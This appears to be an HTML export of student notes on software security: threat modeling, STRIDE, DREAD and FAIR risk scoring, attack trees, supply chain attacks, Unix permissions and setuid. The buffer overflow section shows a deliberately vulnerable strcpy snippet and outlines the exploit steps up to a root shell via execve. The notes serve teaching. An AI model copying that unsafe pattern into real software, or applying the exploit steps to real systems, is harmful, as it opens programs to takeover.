id="12e1a926-7344-8053-a323-ee51f117e7e7" class="bulleted-list"><li style="list-style-type:disc">threat modeling <mark class="highlight-yellow">can be done after or during development</mark><ul id="12e1a926-7344-804f-b7a1-dd505f7a45a1" class="bulleted-list"><li style="list-style-type:circle">harder to fix bugs after implementation, <mark class="highlight-yellow">cheaper to doing during development</mark></li></ul><ul id="12e1a926-7344-8063-871d-dd9b584a2677" class="bulleted-list"><li style="list-style-type:circle">during development consider security of system design</li></ul><ul id="12e1a926-7344-80eb-8c83-e237ee337aa5" class="bulleted-list"><li style="list-style-type:circle">ideally threat modelling is iteratively done all the time, however cannot be done due to changes in future</li></ul></li></ul><ul id="12e1a926-7344-8012-9008-eed8395cb8f6" class="bulleted-list"><li style="list-style-type:disc">Threat Modelling techniques:<figure id="12e1a926-7344-801a-9071-f5177f8314bb" class="image"><a href="Untitled%2081.png"><img style="width:384px" src="Untitled%2081.png"/></a></figure></li></ul><ul id="12e1a926-7344-803e-b7e3-e4298de976e2" class="bulleted-list"><li style="list-style-type:disc">threat modeling is brainstorms: experts get into a room and discuses: people draw upon experience from security experts, security teams, developers</li></ul></div></figure></details></li></ul><ul id="12e1a926-7344-8067-9b4d-dd40f55c97a7" class="toggle"><li><details><summary>STRIDE Analysis</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-8020-9cb4-d8c2fc0c7945"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="26fc5c09-1679-4d81-b55f-2d71e4ef1163" class="">structured threat modeling technique that provides factors we consider</p></div></figure><h3 id="12e1a926-7344-8048-b08e-cb54e7488add" class="">Spoofing</h3><p id="12e1a926-7344-8048-bbf2-ecf96087181a" class="">pretends to be another user, device, system and emulate traffic they might send</p><h3 id="12e1a926-7344-8012-bec1-e8f859c4a1a8" class="">Tampering </h3><p id="12e1a926-7344-8021-a3d4-e5b5999823a0" class="">unauthorized malicious modification of data</p><h3 id="12e1a926-7344-80c7-a660-f4098ed41459" class="">Repudiation </h3><p id="12e1a926-7344-8070-af0f-c3fc2841b6ed" class="">ability to conduct actions within a system and deny ownership of said action</p><h3 id="12e1a926-7344-80aa-be5e-c3c20f0aae35" class="">Information Disclosure</h3><p id="12e1a926-7344-8050-aa64-e2f3cd4ccd4e" class="">loss of data confidentiality as result of unauthorized disclosure of information</p><h3 id="12e1a926-7344-80d4-b48b-f27d2b42ac4b" class="">Denial of Service</h3><p id="12e1a926-7344-808c-9214-c8ac13fafaf4" class="">interacting with a system in such a way that its unable to provide service to other users</p><h3 id="12e1a926-7344-80a2-b83a-eb557882a4e0" class="">Elevation of Privilege</h3><p id="12e1a926-7344-80be-a3f8-daa0a4e526be" class="">gaining access to systems or data that exceeds your assigned privileges </p><h1 id="12e1a926-7344-8068-8ee7-ca476967c0be" class="">Example</h1><p id="12e1a926-7344-8042-8258-fbe352fa49a1" class="">we identify a realistic scenario where an attack can happen on a component that relates to a factor</p><figure id="12e1a926-7344-8067-9ab3-f64850098d39" class="image"><a href="image%2086.png"><img style="width:623.984375px" src="image%2086.png"/></a></figure></details></li></ul><ul id="12e1a926-7344-8060-afda-d417504d0fa5" class="toggle"><li><details><summary>Data Flow Diagram (DFD)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-808d-be88-dc87ba06e355"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="cd2d0da6-a3f6-4057-ac62-172a779c957b" class="">diagram of how data flows through a system, how its processed, stored and shared between other systems</p><ul id="12e1a926-7344-804f-ae1d-fb5881101149" class="bulleted-list"><li style="list-style-type:disc">data flow: directed flow of data between components</li></ul><ul id="12e1a926-7344-807f-853c-cf6fe6a9b34c" class="bulleted-list"><li style="list-style-type:disc">data store: component that stores data</li></ul><ul id="12e1a926-7344-8060-976c-e69ffc3c9de9" class="bulleted-list"><li style="list-style-type:disc">process: component that processes data</li></ul><ul id="12e1a926-7344-80bb-ab19-e8ccb85d3d73" class="bulleted-list"><li style="list-style-type:disc">multi-process:  component that executes multiple process on data</li></ul><ul id="12e1a926-7344-809d-bfd0-d1beb9401b90" class="bulleted-list"><li style="list-style-type:disc">interactor: users/component outside the system that inputs and receives data flow (outside the trust boundary)</li></ul><figure id="12e1a926-7344-8044-9ccb-d38b781a9f73" class="image"><a href="75e7a33a-2bc8-4050-a9ce-a7daf6ef42b6.png"><img style="width:708px" src="75e7a33a-2bc8-4050-a9ce-a7daf6ef42b6.png"/></a></figure><ol type="1" id="12e1a926-7344-80d1-aa06-c66563b41eb8" class="numbered-list" start="1"><li>data cannot flow between 2 interactors</li></ol><ol type="1" id="12e1a926-7344-8048-ace7-cc0517d3c056" class="numbered-list" start="2"><li>data cannot flow between 2 data stores</li></ol><ol type="1" id="12e1a926-7344-8099-88d4-fc4c92a63d29" class="numbered-list" start="3"><li>data cannot flow directly from an interactor to data store</li></ol><ol type="1" id="12e1a926-7344-8071-b3b3-fca72b017068" class="numbered-list" start="4"><li>a process must have at least 1 input &amp; 1 output</li></ol><ol type="1" id="12e1a926-7344-806d-8408-fc2b959ed8f8" class="numbered-list" start="5"><li>data store must have at least 1 input &amp; 1 output</li></ol><ol type="1" id="12e1a926-7344-80f8-8130-dc601c965536" class="numbered-list" start="6"><li>2 data flows cannot cross each other</li></ol><ol type="1" id="12e1a926-7344-802c-87c2-cb20ecce7d3d" class="numbered-list" start="7"><li>all processes must be linked to minimum 1 data store, process or interactor</li></ol></div></figure><h3 id="1301a926-7344-806e-a395-d110ef999a97" class="">Example</h3><figure id="12e1a926-7344-80c8-93ec-deb1ae207447" class="image"><a href="Untitled%2082.png"><img style="width:624px" src="Untitled%2082.png"/></a></figure><figure id="12e1a926-7344-80a1-b2ac-ce496dae80a7" class="image"><a href="Untitled%2083.png"><img style="width:416px" src="Untitled%2083.png"/></a></figure></details></li></ul></details></li></ul><ul id="12d1a926-7344-805f-9c97-fd16b69c7361" class="toggle"><li><details><summary>Risk Assessment and Attack Trees</summary><ul id="12e1a926-7344-8023-afd4-f0e9c03ba40f" class="toggle"><li><details><summary>Qualitative (DREAD) &amp; Quantitively (FAIR) Risk</summary><h3 id="12e1a926-7344-80b9-9431-c0d34a5870a8" class="">Qualitative Risk</h3><p id="12e1a926-7344-8075-baa5-dd07ceb40f7e" class="">risk is a probability, high or low</p><p id="12e1a926-7344-80bd-a1db-c8e890c5623c" class="">inputs are: risk type, likelihood and possible impacts</p><h3 id="12e1a926-7344-801b-bb72-fd899fa49e6d" class="">DREAD</h3><p id="12e1a926-7344-8045-b8f1-ffa1b7001c49" class="">Qualitative risk measurement technique</p><ul id="12e1a926-7344-80d9-a9ae-f17b6119b067" class="bulleted-list"><li style="list-style-type:disc">each factor is ranked by 10<ul id="12e1a926-7344-80bf-92f7-e6adaef1a5aa" class="bulleted-list"><li style="list-style-type:circle">Damage potential: if a threat exploit occurs, evaluate damages</li></ul><ul id="12e1a926-7344-8097-85ed-f0aa6b21770c" class="bulleted-list"><li style="list-style-type:circle">Reproducibility: how easy is it to keep doing this threat?</li></ul><ul id="12e1a926-7344-8072-9b41-db903ab96098" class="bulleted-list"><li style="list-style-type:circle">Exploitability: what resources are needed do this exploit?</li></ul><ul id="12e1a926-7344-8017-8e44-cdd680df9cba" class="bulleted-list"><li style="list-style-type:circle">Affected Users: how many people are affected?</li></ul><ul id="12e1a926-7344-8003-824e-e69b41a6d91f" class="bulleted-list"><li style="list-style-type:circle">Discoverability: how easy is it to detect the threat?</li></ul></li></ul><ul id="12e1a926-7344-80f5-8e03-f7a9b063258c" class="bulleted-list"><li style="list-style-type:disc">add up each factor for a ranking<ul id="12e1a926-7344-80ab-8432-c075a80ab756" class="bulleted-list"><li style="list-style-type:circle">40-50: critical </li></ul><ul id="12e1a926-7344-80a5-8852-cce71a2843ba" class="bulleted-list"><li style="list-style-type:circle">25-39: high</li></ul><ul id="12e1a926-7344-80ed-8bda-dd9daca03255" class="bulleted-list"><li style="list-style-type:circle">11-24: medium </li></ul><ul id="12e1a926-7344-8035-9343-f594bd426483" class="bulleted-list"><li style="list-style-type:circle">1-10: low</li></ul></li></ul><ul id="12e1a926-7344-8052-b86c-d1bbe1e7bdf9" class="bulleted-list"><li style="list-style-type:disc">there are different variations of dread. eg: assuming certain factors are at max</li></ul><ul id="12e1a926-7344-80be-a682-f92c7aa95233" class="bulleted-list"><li style="list-style-type:disc">problems: subjective, requires extensive security experiences, might miss real targets</li></ul><ul id="12e1a926-7344-80d3-820c-d20ee6b0c379" class="bulleted-list"><li style="list-style-type:disc">bug bars (different people from the company) get together to come up with better DREAD scores</li></ul><h3 id="12e1a926-7344-80c0-8472-db7394d7ceeb" class="">Quantitively Risk</h3><p id="12e1a926-7344-80af-8f21-c08cb2677143" class="">risk expresses it in terms of numerical values (probability) or cost</p><h3 id="12e1a926-7344-803b-96ba-ce94907cc850" class="">Fair</h3><p id="12e1a926-7344-808c-a6d4-c0dfca257dc0" class="">quantitively risk measurement technique that breaks risk into discrete blocks and assigns frequencies and dollar values</p><figure id="12e1a926-7344-8058-bf49-ff0c7c1b106e" class="image"><a href="Untitled%2084.png"><img style="width:651.96875px" src="Untitled%2084.png"/></a></figure></details></li></ul><p id="1391a926-7344-802e-84d0-f8d25a0621e7" class="">
</p><ul id="12e1a926-7344-807b-9e02-cc864bb442e0" class="toggle"><li><details><summary>Attack Trees</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-80ba-96fd-cebb3f436063"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e7de5c5f-050e-4636-adb7-4fafc4055476" class="">tree diagram where <mark class="highlight-yellow">nodes represent events</mark> that occur when their children occur</p><ul id="12e1a926-7344-80f8-8855-f7bcef6a8de4" class="bulleted-list"><li style="list-style-type:disc">used for risk assessment: more events = less risk</li></ul><ul id="12e1a926-7344-8041-8ee7-d556e99f0b11" class="bulleted-list"><li style="list-style-type:disc">AND nodes means all children have to occur, OR nodes mean 1 child has to occur</li></ul><figure id="12e1a926-7344-80d7-ade2-f8d4b23a6c41" class="image"><a href="Untitled%2085.png"><img style="width:651.984375px" src="Untitled%2085.png"/></a><figcaption>1. if “driver doesn’t see object” AND “car fails to brake”, then the root node “car hits object&quot; occurs<br/>2. car fails to brake if “Car is going too fast” OR “brakes are weak”<br/></figcaption></figure></div></figure><h3 id="12e1a926-7344-8087-a428-eb049e27e9b0" class="">Building Attack Trees</h3><ol type="1" id="12e1a926-7344-8031-83c3-e3f61be299ff" class="numbered-list" start="1"><li>start root of tree with the objective of the attack</li></ol><ol type="1" id="12e1a926-7344-80a3-99e7-d5c5620ac9cd" class="numbered-list" start="2"><li>add branches to nodes that says how they will occur</li></ol><ol type="1" id="12e1a926-7344-80c2-95ad-e119b2cdd5c0" class="numbered-list" start="3"><li>repeat for each node until there are no futhur step</li></ol><ul id="12e1a926-7344-8032-8dc3-f56963e7b2e2" class="bulleted-list"><li style="list-style-type:disc">final leaf nodes find the root cause of the attack and shows how to mitigate it</li></ul><figure id="12e1a926-7344-8050-a4e6-f4cdc24f72fa" class="image"><a href="Untitled%2086.png"><img style="width:623.984375px" src="Untitled%2086.png"/></a></figure><p id="12e1a926-7344-8065-a187-cf18df697a79" class="">after ranking which risk are the worse: look at resource and pick the ones you’re going to mitigate </p></details></li></ul></details></li></ul><ul id="12d1a926-7344-808c-95a1-c999712e3903" class="toggle"><li><details><summary>Security Code Reviews, Security Testing, and Supply Chain Attacks </summary><ul id="12e1a926-7344-80cc-9dbb-ef1fa7f0148c" class="toggle"><li><details><summary>Security Code Reviews</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-806d-a07c-f3ed10a1a002"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="b0c4a4a8-2b6d-4e41-b436-753e38826fe2" class="">manual testing process of reviewing source code of for security control</p><ul id="12e1a926-7344-804b-9617-f3967e661cdf" class="bulleted-list"><li style="list-style-type:disc">makes sure its present, works as intended and are invoked in right places</li></ul><ul id="12e1a926-7344-804c-a1d3-ca1ce2dc44cb" class="bulleted-list"><li style="list-style-type:disc">programs are developed to be “self defending”</li></ul><ul id="12e1a926-7344-80a3-8006-e018164463e8" class="bulleted-list"><li style="list-style-type:disc">easier to find variabilities before production</li></ul><ul id="12e1a926-7344-80d1-b5b8-dcb04e0cf1db" class="bulleted-list"><li style="list-style-type:disc">good coding practices makes it easier to read during reviews</li></ul></div></figure><h3 id="12e1a926-7344-80e9-a142-c0b256d4000a" class="">Variations</h3><ul id="12e1a926-7344-808d-a9fd-efb3859d3a8d" class="bulleted-list"><li style="list-style-type:disc">Inspections: formal code review with:<ul id="12e1a926-7344-801d-809f-dd1155cf74c5" class="bulleted-list"><li style="list-style-type:circle">roles: moderator, author, reviewer…</li></ul><ul id="12e1a926-7344-805f-8ff9-e29d4fc2c862" class="bulleted-list"><li style="list-style-type:circle">serval reviewers looking at the same code</li></ul><ul id="12e1a926-7344-80fa-882a-f5c0b6417954" class="bulleted-list"><li style="list-style-type:circle">specified expected outcomes </li></ul></li></ul><ul id="12e1a926-7344-8046-a234-d1ca9598eec6" class="bulleted-list"><li style="list-style-type:disc">Walkthrough: informal discussion of code between author and reviewer</li></ul><ul id="12e1a926-7344-8035-b8d1-e01a2e0c0303" class="bulleted-list"><li style="list-style-type:disc">Code reading: reviewers look at code by themselves (no meeting)</li></ul></details></li></ul><ul id="12e1a926-7344-80e0-a54d-c111c2e84a9d" class="toggle"><li><details><summary>Security Testing</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-80b7-974e-f120a0cccbf5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="edf3d48e-f491-463a-9c7f-178f1ae6c269" class="">evaluating system/network by methodically validating/verifying effectiveness of security controls</p><ul id="12e1a926-7344-8030-8edd-edd727299279" class="bulleted-list"><li style="list-style-type:disc">testing is needed to find bugs so it meets specification</li></ul><ul id="12e1a926-7344-80f7-9b9d-ded6fa7b4a73" class="bulleted-list"><li style="list-style-type:disc">testing increases confidence in software: cannot find all bugs</li></ul><ul id="12e1a926-7344-802d-9685-e844ae110da5" class="bulleted-list"><li style="list-style-type:disc">security testing is when the tester thinks like an attacker<ul id="12e1a926-7344-80f6-902e-f11526fce87e" class="bulleted-list"><li style="list-style-type:circle">bugs are caused accidentally, security vulnerabilities are caused deliberately</li></ul><ul id="12e1a926-7344-80ae-8bba-f68b792be572" class="bulleted-list"><li style="list-style-type:circle">eg: spoofing another’s identity</li></ul></li></ul><figure id="12e1a926-7344-8093-8d42-ec452cd65922" class="image"><a href="Untitled%2087.png"><img style="width:554px" src="Untitled%2087.png"/></a></figure></div></figure></details></li></ul><ul id="12e1a926-7344-80d8-a76d-e1c3d524b296" class="toggle"><li><details><summary>Supply Chain Attacks </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-80ef-b2f5-f1503b6f2a6d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="16332a5a-abee-48f0-8720-661357f87d82" class="">vulnerabilities introduced through a third-party component/process</p><ul id="12e1a926-7344-8060-8990-f1befbb8a26c" class="bulleted-list"><li style="list-style-type:disc">your weakness are weaknesses of your dependencies</li></ul><ul id="12e1a926-7344-80ad-af9c-d3f468ec6a21" class="bulleted-list"><li style="list-style-type:disc">can occur at any stage of the software supply chain<ul id="12e1a926-7344-8017-b646-d72be1a080d0" class="bulleted-list"><li style="list-style-type:circle">compromised third party libraries</li></ul><ul id="12e1a926-7344-804c-8205-c31fb8026d06" class="bulleted-list"><li style="list-style-type:circle">malicious code injection</li></ul><ul id="12e1a926-7344-80e4-a692-ddf83b3cad5e" class="bulleted-list"><li style="list-style-type:circle">exploiting trusted update channels</li></ul><ul id="12e1a926-7344-80cf-b1cd-c779b3cbbabd" class="bulleted-list"><li style="list-style-type:circle">insider threat during development</li></ul><ul id="12e1a926-7344-801c-b190-f724973a3b3b" class="bulleted-list"><li style="list-style-type:circle">misconfiguration of third party libraries</li></ul></li></ul><ul id="12e1a926-7344-8084-be5b-c08e50352f33" class="bulleted-list"><li style="list-style-type:disc">exploits trust in established vendors/process. eg: ISP attack </li></ul></div></figure><h3 id="12e1a926-7344-80d4-8c38-cf7739a03225" class="">Mitigations</h3><ul id="12e1a926-7344-8022-98f0-def5e55b54f0" class="bulleted-list"><li style="list-style-type:disc">vender assignment and management</li></ul><ul id="12e1a926-7344-80e6-975a-c0a9b16bc84f" class="bulleted-list"><li style="list-style-type:disc">regular security audits</li></ul><ul id="12e1a926-7344-8007-b19f-d732816d7b45" class="bulleted-list"><li style="list-style-type:disc">software composition analysis (SCA) tools</li></ul><ul id="12e1a926-7344-80b1-aea8-f7b7b10ba590" class="bulleted-list"><li style="list-style-type:disc">keeping dependencies up to date</li></ul><ul id="12e1a926-7344-80cc-b1bb-ca850f8d9eba" class="bulleted-list"><li style="list-style-type:disc">code reviews</li></ul><ul id="12e1a926-7344-805d-b772-e57896f0f1ca" class="bulleted-list"><li style="list-style-type:disc">principle of least privilege </li></ul><p id="12e1a926-7344-8021-b7dd-ca1a91b9ae14" class="">
</p></details></li></ul></details></li></ul><ul id="12d1a926-7344-802e-a3ea-d6ba638aef37" class="toggle"><li><details><summary>Privilege Escalation</summary><ul id="12e1a926-7344-8040-9f2c-d1927ebfea49" class="toggle"><li><details><summary>Access Control Mechanisms</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-8020-9dc7-f27912f9dfcd"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="12e1a926-7344-809c-a74e-d60efeba0fa9" class="">controls which user can read, write execute</p><ul id="76a6b981-34e3-4448-a4ca-98ce07196289" class="bulleted-list"><li style="list-style-type:disc">two types of access control<ul id="12e1a926-7344-801c-a4d0-f637ea4a7b33" class="bulleted-list"><li style="list-style-type:circle">Discretionary (DAC)<ul id="12e1a926-7344-8074-be76-cae131ddcf8d" class="bulleted-list"><li style="list-style-type:square">owner of object specifies who can access objects</li></ul><ul id="12e1a926-7344-80e3-af54-fce4d540acd9" class="bulleted-list"><li style="list-style-type:square">control access on discretion of owner</li></ul><ul id="12e1a926-7344-806f-878e-c21e260fe291" class="bulleted-list"><li style="list-style-type:square">access privileges decided when file created </li></ul></li></ul><ul id="12e1a926-7344-80b4-921b-e48ca98ecfd9" class="bulleted-list"><li style="list-style-type:circle">Mandatory (MAC)<ul id="12e1a926-7344-80d6-a2f3-cf62a14f090b" class="bulleted-list"><li style="list-style-type:square">system specifies which user/process can access which object</li></ul><ul id="12e1a926-7344-8097-a03e-da393ff649c9" class="bulleted-list"><li style="list-style-type:square">based on security labels: subjects are given clearance, objects are given security classification </li></ul></li></ul><ul id="12e1a926-7344-8086-8a5a-f1d74ad5ddcc" class="bulleted-list"><li style="list-style-type:circle">we will focus on DAC</li></ul></li></ul></div></figure></details></li></ul><ul id="12e1a926-7344-809f-afd9-f27c6e3ce62d" class="toggle"><li><details><summary>Unix File Permissions (user, group, other rights, 9 bit permission model)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12e1a926-7344-80f1-a327-fea7bc852b73"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="12e1a926-7344-8084-9ee9-ff77112c88c5" class="">Unix specifies file permissions/rights using a 9 bit permission model</p><ul id="12e1a926-7344-80a1-983d-f3428a41c638" class="bulleted-list"><li style="list-style-type:disc">read, write, execute each are 1 bit</li></ul><ul id="12e1a926-7344-80e2-8001-e0a398572f19" class="bulleted-list"><li style="list-style-type:disc">3 rwx bits for user, group and other rights</li></ul><figure id="12e1a926-7344-8039-b22b-dd6b51c93a6d" class="image"><a href="image%2087.png"><img style="width:623.9375px" src="image%2087.png"/></a></figure><figure id="12e1a926-7344-8066-a2ea-cfbbb629539f" class="image"><a href="image%2088.png"><img style="width:652px" src="image%2088.png"/></a></figure><ul id="12e1a926-7344-80ec-a612-cabea9b76fc1" class="bulleted-list"><li style="list-style-type:disc">ls -l &lt;dir&gt; shows the 9 bit permission specifier next to each file in the directory<ul id="12e1a926-7344-80b8-9a06-d9e2837cb110" class="bulleted-list"><li style="list-style-type:circle">next value is the size of file/dir, followed by user id (UID) and group id (GUID)</li></ul></li></ul></div></figure><h3 id="12e1a926-7344-8072-b01d-c19c7e7b3c20" class="">Users &amp; Root</h3><ul id="12e1a926-7344-801e-8dcf-f8930095daaa" class="bulleted-list"><li style="list-style-type:disc">Unix identifies users using a UID</li></ul><ul id="12e1a926-7344-8028-a27a-eaa6459b04aa" class="bulleted-list"><li style="list-style-type:disc">users can manually be given rights</li></ul><ul id="12e1a926-7344-80cb-86e5-cedf93786495" class="bulleted-list"><li style="list-style-type:disc">special user called “root” has rights to do anything (aka super user)</li></ul><h3 id="12e1a926-7344-80df-8fd3-cba43d978b0b" class="">Groups</h3><ul id="12e1a926-7344-80c3-b6f3-cf6834477019" class="bulleted-list"><li style="list-style-type:disc">Unix groups are a logical collection of users</li></ul><ul id="12e1a926-7344-8064-864b-e2c0fb95b858" class="bulleted-list"><li style="list-style-type:disc">all members of the same group share the same permissions</li></ul><ul id="12e1a926-7344-80c3-9007-d91972984c77" class="bulleted-list"><li style="list-style-type:disc"><code>groups</code> command lists the groups you are in</li></ul><h3 id="12e1a926-7344-8029-9816-e08fa8793670" class="">Others (aka world)</h3><p id="12e1a926-7344-80d5-993b-dff95ca8b1a8" class="">when user are neither root, specific user or member of a group, other rights apply in this case</p></details></li></ul><ul id="12f1a926-7344-80c2-98dd-f2604b6546d1" class="toggle"><li><details><summary>Privileged Programs (Daemons &amp; Set UID Programs)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-8032-90be-cd91679524b2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="c7d7bbf1-28ba-4745-84a6-f1570bdced41" class="">programs need privileges. </p><ul id="12f1a926-7344-8064-9094-e55f51484540" class="bulleted-list"><li style="list-style-type:disc">eg: how do normal users change their password? privilege programs write to shadowFile for them</li></ul><ul id="12f1a926-7344-8018-8d6c-e959191a4c79" class="bulleted-list"><li style="list-style-type:disc">could implement fine-grain access control, but makes OS too complicated</li></ul><ul id="12f1a926-7344-80da-bde7-f9e92e83fb3a" class="bulleted-list"><li style="list-style-type:disc">instead, OS allows programs to escalate privileges to a higher level to do something unsafe</li></ul></div></figure><h3 id="12f1a926-7344-80fd-9898-e56aa21b2d7a" class="">Types of Privileged Programs</h3><ul id="12f1a926-7344-8002-a6dd-f4459cea87d1" class="bulleted-list"><li style="list-style-type:disc">Daemons<ul id="12f1a926-7344-807d-81ca-fb42171ab5ab" class="bulleted-list"><li style="list-style-type:circle">process that runs in the background</li></ul><ul id="12f1a926-7344-802c-a8c6-eb1e82bce3f7" class="bulleted-list"><li style="list-style-type:circle">needs to run as root or other privileged users</li></ul></li></ul><ul id="12f1a926-7344-80de-b38c-da5cd511b7e9" class="bulleted-list"><li style="list-style-type:disc">Set UID programs<ul id="12f1a926-7344-807d-826a-d011d79e6a87" class="bulleted-list"><li style="list-style-type:circle">program marked with special bit</li></ul><ul id="12f1a926-7344-80ad-a644-f584e6a5cef9" class="bulleted-list"><li style="list-style-type:circle">in c programs, calls can allow program to ask for higher permissions<ul id="12f1a926-7344-8004-b4f1-d915ab6452af" class="bulleted-list"><li style="list-style-type:square">will only work if user executing the program has a special bit</li></ul></li></ul><ul id="12f1a926-7344-809e-bbc5-d794d2c20218" class="bulleted-list"><li style="list-style-type:circle">commonly used in UNIX systems</li></ul><p id="12f1a926-7344-80e4-83f3-c41a7ebe8efd" class="">
</p></li></ul></details></li></ul><ul id="12f1a926-7344-80a0-884c-ec4f03a11809" class="toggle"><li><details><summary>Set UID</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-80f5-bbbe-f0f3190fb638"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="bb8e553f-9729-4d9f-90e1-04e7b4ffcc35" class="">allows users <mark class="highlight-red">run programs with </mark><mark class="highlight-red"><mark class="highlight-red_background"><span style="border-bottom:0.05em solid">program owners</span></mark></mark><mark class="highlight-red"> privileges </mark></p><ul id="12f1a926-7344-80d4-999a-f9ce4cab4007" class="bulleted-list"><li style="list-style-type:disc">programs runs with temporarily elevated privileges</li></ul><ul id="12f1a926-7344-8041-b351-c1e0a4c500f7" class="bulleted-list"><li style="list-style-type:disc">processes have 2 IDs<ul id="12f1a926-7344-800f-aaad-ed617806bc9a" class="bulleted-list"><li style="list-style-type:circle">Real UID (RUID) ids the real owner of a process</li></ul><ul id="12f1a926-7344-80aa-94a9-e687ce175f20" class="bulleted-list"><li style="list-style-type:circle">Effective UID (EUID) ids the privilege of a process </li></ul></li></ul><ul id="12f1a926-7344-80df-8f04-e63bf7893760" class="bulleted-list"><li style="list-style-type:disc">normally RUID == EUID</li></ul><ul id="12f1a926-7344-80ad-974f-c34d7fc5c2ad" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">set UID sets EUID to the program owner</mark><ul id="12f1a926-7344-80c6-ad02-d2a05c7fd31b" class="bulleted-list"><li style="list-style-type:circle">RUID is still the user id</li></ul><ul id="12f1a926-7344-8030-ae85-dbf861932cf0" class="bulleted-list"><li style="list-style-type:circle">if program is owned by root, program will run with root privileges  </li></ul></li></ul></div></figure></details></li></ul></details></li></ul><ul id="12d1a926-7344-8004-a2dd-c5047792d587" class="toggle"><li><details><summary>Buffer Overflow</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-80b9-b793-f810251bc44c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="d8f0c78a-cab4-48e4-b972-f7451dde1d56" class="">user <mark class="highlight-yellow">input exceeds the allocated buffer size</mark>. </p><p id="12f1a926-7344-8051-a445-d84d0d4dbe4c" class="">buffer overflow allows for <mark class="highlight-yellow">malicious code to take over</mark> the program</p><ul id="12f1a926-7344-80c8-bcc6-cf2de67394a4" class="bulleted-list"><li style="list-style-type:disc">overflow overrides memory</li></ul><ul id="12f1a926-7344-80ca-ab9b-ff36ae3e843f" class="bulleted-list"><li style="list-style-type:disc">function return address can point to anything (attacker code)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="12f1a926-7344-8055-85b5-f009cb8be4bf" class="code"><code class="language-C">void foo(char* str){
		char buffer[12]; 
		strcpy(buffer, str); //stack overflow :(
}

char* input = calloc(10, sizeof(char)); //too big :O
foo(input);</code></pre><ol type="1" id="12f1a926-7344-80f7-9c3a-dbf83993a539" class="numbered-list" start="1"><li>attack has control over the input</li></ol><ol type="1" id="12f1a926-7344-804e-bb01-cf3f89ef81e1" class="numbered-list" start="2"><li>find the distance between base of the buffer and return address (using gdb)</li></ol><ol type="1" id="12f1a926-7344-800a-b983-ece555c23725" class="numbered-list" start="3"><li>find address to place the shell code (a place where shell code ends where return address ends)<figure id="12f1a926-7344-80eb-a2ea-ec640c5b6770" class="image"><a href="image%2089.png"><img style="width:480px" src="image%2089.png"/></a></figure></li></ol><ol type="1" id="12f1a926-7344-80f3-a18a-d5ecd536068a" class="numbered-list" start="4"><li>assembly shell code gives attacker a root shell, done by calling <code>execve(“/bin/sh”,argv,0)</code><figure id="12f1a926-7344-80af-988f-c69f04b5997f" class="image"><a href="image%2090.png"><img style="width:465px" src="image%2090.png"/></a></figure></li></ol></div></figure><ul id="12f1a926-7344-8054-a391-fb4a53d938f1" class="toggle"><li><details><summary>Function Stack Frame Memory Allocation</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="12f1a926-7344-807b-91aa-d362e061ecc8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="e9c9a89c-5849-40e9-a51b-f11760e0cf35" class="">calling a function with arguments allocates variables to the stack</p><ol type="1" id="12f1a926-7344-807e-8815-e5ec408f9814" class="numbered-list" start="1"><li>local variables in the function are allocated in arbitrary order first</li></ol><ol type="1" id="12f1a926-7344-80e5-a665-dda2d477ed2f" class="numbered-list" start="2"><li>ebp (address to previous frame pointer) </li></ol><ol type="1" id="12f1a926-7344-80c2-9e7b-c141acf269f1" class="numbered-list" start="3"><li>return address (address to the next frame pointer)</li></ol><ol type="1" id="12f1a926-7344-80c5-8f89-de1aa3c0e436" class="numbered-list" start="4"><li>arguments are allocated in reverse order</li></ol><figure id="12f1a926-7344-8003-a18e-fcc85e31a157" class="image"><a href="ac77f499-6086-4953-b8f1-6a8d760c7eb7.png"><img style="width:447.192429022082px" src="ac77f499-6086-4953-b8f1-6a8d760c7eb7.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" 